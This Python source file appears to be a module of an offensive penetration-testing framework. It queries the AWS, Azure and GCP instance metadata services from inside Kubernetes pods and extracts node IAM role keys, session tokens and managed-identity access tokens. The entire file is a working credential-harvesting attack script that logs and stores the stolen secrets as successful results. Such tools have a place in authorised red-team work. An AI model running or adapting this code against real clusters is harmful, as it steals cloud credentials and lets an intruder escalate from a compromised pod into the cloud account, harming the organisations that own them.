"""Extract cloud provider credentials via IMDS from within K8s pods."""

from __future__ import annotations

from typing import Any, Dict, List, Optional

from kraken.models import AttackResult, Credential, EngagementContext
from kraken.logger import log
from kraken.modules.base import BaseModule

try:
    import requests
    import urllib3
    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
    HAS_REQUESTS = True
except ImportError:
    requests = None  # type: ignore[assignment]
    HAS_REQUESTS = False

# Cloud IMDS endpoints (accessible from within K8s pods)
CLOUD_IMDS: Dict[str, Dict[str, Any]] = {
    "aws_eks": {
        "url": "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
        "indicator": ["iam", "ec2"],
        "follow_up": "http://169.254.169.254/latest/meta-data/iam/security-credentials/{role}",
    },
    "azure_aks": {
        "url": ("http://169.254.169.254/metadata/identity/oauth2/token"
                "?api-version=2018-02-01&resource=https://management.azure.com/"),
        "headers": {"Metadata": "true"},
        "indicator": ["access_token"],
    },
    "gke_metadata": {
        "url": "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token",
        "headers": {"Metadata-Flavor": "Google"},
        "indicator": ["access_token"],
    },
    "gke_project": {
        "url": "http://metadata.google.internal/computeMetadata/v1/project/project-id",
        "headers": {"Metadata-Flavor": "Google"},
        "indicator": [],
    },
}


class CloudBridgeModule(BaseModule):
    """Extract cloud provider credentials via IMDS from within K8s pods."""

    name = "cloud-bridge"

    def run(self, ctx: EngagementContext, **kwargs: object) -> List[AttackResult]:
        results: List[AttackResult] = []
        if not HAS_REQUESTS:
            return [AttackResult("cloud-bridge", "setup", "FAILED",
                                 notes="Install requests: pip install requests")]

        for cloud_name, endpoint in CLOUD_IMDS.items():
            result = self._probe_imds(ctx, cloud_name, endpoint)
            if result:
                results.append(result)

        if not results:
            results.append(AttackResult("cloud-bridge", "imds_scan", "INFO",
                                        notes="No cloud metadata endpoints accessible from this context"))
        return results

    def _probe_imds(self, ctx: EngagementContext,
                    cloud_name: str, endpoint: Dict[str, Any]) -> Optional[AttackResult]:
        url = endpoint["url"]
        hdrs = endpoint.get("headers", {})
        indicators = endpoint.get("indicator", [])
        try:
            resp = requests.get(url, headers=hdrs, timeout=3, verify=False)
            body = resp.text
            if resp.status_code != 200:
                return None
            if indicators and not any(i.lower() in body.lower() for i in indicators):
                return None

            log(f"[CloudBridge] IMDS accessible: {cloud_name} at {url}", "CRIT")

            # Extract credentials based on cloud type
            if cloud_name == "aws_eks":
                # Get role name, then request credentials
                role_name = body.strip().split("\n")[0].strip()
                cred_url = endpoint["follow_up"].format(role=role_name)
                cred_resp = requests.get(cred_url, timeout=3)
                if cred_resp.ok:
                    cred_data = cred_resp.json()
                    if "AccessKeyId" in cred_data:
                        log(f"[CloudBridge] AWS EKS node creds: {cred_data['AccessKeyId']}", "CRIT")
                        ctx.credentials.append(Credential(
                            "aws_eks_node_role",
                            {"AccessKeyId": cred_data["AccessKeyId"],
                             "SecretAccessKey": cred_data.get("SecretAccessKey", ""),
                             "Token": cred_data.get("Token", ""),
                             "Expiration": cred_data.get("Expiration", "")},
                            f"imds:{url}",
                            f"EKS node role '{role_name}' credentials",
                        ))
                        return AttackResult(
                            "cloud-bridge", "aws_eks_creds", "SUCCESS",
                            severity="CRITICAL",
                            data={"role": role_name, "key_id": cred_data["AccessKeyId"]},
                            notes=f"AWS EKS node role '{role_name}' creds extracted via IMDS",
                        )
            elif cloud_name in ("azure_aks", "gke_metadata"):
                try:
                    data = resp.json()
                    token = data.get("access_token", "")
                    if token:
                        log(f"[CloudBridge] {cloud_name} token: {token[:30]}...", "CRIT")
                        ctx.credentials.append(Credential(
                            f"{cloud_name}_token",
                            {"access_token": token, "token_type": data.get("token_type", "")},
                            f"imds:{url}",
                            f"{cloud_name} managed identity token via IMDS",
                        ))
                        return AttackResult(
                            "cloud-bridge", f"{cloud_name}_token", "SUCCESS",
                            severity="CRITICAL",
                            data={"cloud": cloud_name, "token": token[:40] + "..."},
                            notes=f"{cloud_name} access token extracted via pod IMDS access",
                        )
                except Exception:
                    pass
            elif cloud_name == "gke_project":
                project_id = body.strip()
                return AttackResult("cloud-bridge", "gke_project", "INFO",
                                    data={"project_id": project_id},
                                    notes=f"GCP Project ID: {project_id}")
        except Exception:
            return None
        return None
